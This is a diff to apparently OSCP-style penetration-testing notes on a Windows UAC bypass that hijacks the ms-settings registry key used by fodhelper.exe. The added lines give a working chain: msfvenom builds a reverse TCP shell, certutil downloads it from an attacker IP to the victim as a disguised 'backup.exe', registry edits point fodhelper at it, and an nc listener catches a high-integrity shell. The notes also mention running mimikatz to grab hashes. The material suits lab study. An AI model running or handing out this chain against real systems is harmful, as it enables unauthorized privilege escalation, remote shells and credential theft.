@@ -1285,7 +1285,7 @@ to high. As we will soon demonstrate, the fodhelper.exe509 binary runs as high i
 1709. We can leverage this to bypass UAC because of the way fodhelper interacts with the
 Windows Registry. More specifically, it interacts with registry keys that can be modified without
 administrative privileges. We will attempt to find and modify these registry keys in order to run a
-command of our choosing with high integrity
+command of our choosing with high integrity. Its important to check the system arch of your reverse shell.
 ````
 whoami /groups #check your integrity level/to get high integrity level to be able to run mimikatz and grab those hashes  
 ````
@@ -1293,6 +1293,7 @@ whoami /groups #check your integrity level/to get high integrity level to be abl
 C:\Windows\System32\fodhelper.exe #32 bit
 C:\Windows\SysNative\fodhelper.exe #64 bit
 ````
+#### Powershell
 Launch Powershell and run the following
 ````
 New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
@@ -1302,6 +1303,27 @@ Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -
 run fodhelper setup and nc shell and check your priority
 ````
 C:\Windows\System32\fodhelper.exe
+````
+#### cmd.exe
+##### Enumeration
+````
+whoami /groups
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
+````
+##### Exploitation
+````
+REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command #victim machine
+REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ #victim machine
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.140 LPORT=80 -f exe -o shell.exe #on your kali
+certutil -urlcache -split -f http://192.168.119.140:80/shell.exe C:\Windows\Tasks\backup.exe #victim machine
+REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Windows\Tasks\backup.exe" /f #victim machine
+nc -nlvp 80 #on your kali
+C:\Windows\system32>fodhelper.exe #victim machine
+````
+##### Final Product
+````
+whoami /groups
+Mandatory Label\High Mandatory Level       Label            S-1-16-12288 
 ````
 ### Leveraging Unquoted Service Paths
 Another interesting attack vector that can lead to privilege escalation on Windows operating systems revolves around unquoted service paths.1 We can use this attack when we have write permissions to a service's main directory and subdirectories but cannot replace files within them. Please note that this section of the module will not be reproducible on your dedicated client. However, you will be able to use this technique on various hosts inside the lab environment.
